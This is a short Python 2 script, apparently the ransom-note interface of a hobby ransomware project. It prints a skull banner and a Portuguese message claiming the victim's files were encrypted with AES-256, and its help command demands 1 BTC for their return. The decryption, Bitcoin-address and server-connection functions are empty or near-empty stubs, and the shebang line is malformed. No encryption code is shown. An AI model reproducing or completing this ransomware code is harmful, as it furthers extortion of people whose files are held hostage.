#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho
import os

skull='''
   .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :
                              .

        TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS COM AES-256
                    digite 'help' para obter ajuda
'''
ajuda='''
Olá, todos os seus arquivos importantes foram criptografados, para te-los de volta você precisa efetuar um pagamento de 1 BTC


'''
def decrypt():
    f=open('caminho_gc.txt','r')
    caminho=f.read()

    if(os.path.isdir(caminho)):
        os.chdir(caminho)

def bitcoin_addr():
    a=0
def identificador(pergunta):
    os.system('clear')
    if(pergunta=='ajuda' or pergunta=='help'):
        print(ajuda)
def conect_to_serv():
    a=0


def chat():
    while True:
        try:
            pergunta=raw_input('~> ')
            identificador(pergunta.lower())
        except KeyboardInterrupt:
            a=raw_input('deseja sair? ')
            if(a=='sim' or a=='s' or a=='1'):
                exit()

if __name__=='__main__':
    print(skull)
    chat()
